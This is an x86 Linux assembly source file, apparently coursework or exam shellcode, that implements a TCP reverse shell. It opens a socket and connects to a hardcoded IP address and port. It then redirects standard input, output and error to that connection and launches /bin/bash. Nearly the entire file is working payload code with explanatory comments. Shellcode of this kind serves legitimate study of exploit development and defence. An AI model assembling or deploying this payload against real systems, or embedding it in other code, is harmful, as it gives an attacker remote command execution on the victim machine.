; exam_reverse_shell_tcp.nasm
; Author: Chase Hatch

; int socket(int domain, int type, int protocol);
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; int dup2(int oldfd, int newfd);
; int execve(const char *filename, char *const argv[], char *const envp[]);

; socketcall call numbers:  http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html
; fgrep SYS /usr/include/linux/net.h


section .text
global _start
_start:

	; Zero registers
	xor eax, eax	;zero out the regs
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
	xor edi, edi

	; socketcall(socket())
	mov al, 102	; socketcall()
	mov bl, 0x1	; socketcall(socket())
	push edi	; 0x00000000
	push ebx	; SOCK_STREAM
	push 0x2	; AF_INET
	mov ecx, esp	; *&(AF_INET, SOCK_STREAM, 0)
	int 0x80

	; socketcall(connect())
	xchg esi, eax	; esi <- eax(sockfd)
	mov al, 102	; socketcall()
	push edi	; 0x00000000
	push 0xb438a8c0 ; IP: 192.168.56.180
	push word 0x973a ; PORT: 14999
	inc ebx		; ebx now 0x2
	push bx		; AF_INET
	inc ebx		; ebx now 0x3 socket() call#
	mov ecx, esp	; *&(AF_INET, hton(port), s_addr(IP))
	push 16		; addr_len
	push ecx	; *&(AF_INET, hton(port), s_addr(IP))
	push esi	; sockfd
	mov ecx, esp	; *&(sockfd, *&(AF_inet, hton(port), s_addr(IP)), 16)
	int 0x80

	; dup2(sockfd, {2,1,0})
	xchg ecx, ebx	; junk <-> 0x3
	xchg ebx, esi	; junk <-> sockfd
	mov eax, edi	; junk <-> NULL
loop:
	mov al, 63
	dec ecx
	int 0x80
	jnz loop

	; execve("/bin/bash", NULL, NULL)
	mov al, 0xb
	push edi		; 0x00000000
	push 0x68736162 	;  hsab 
	push 0x2f2f2f6e 	;  ///n 
	push 0x69622f2f 	;  ib// 
	mov ebx, esp		; *&"//bin///bash"
	int 0x80	
	
	
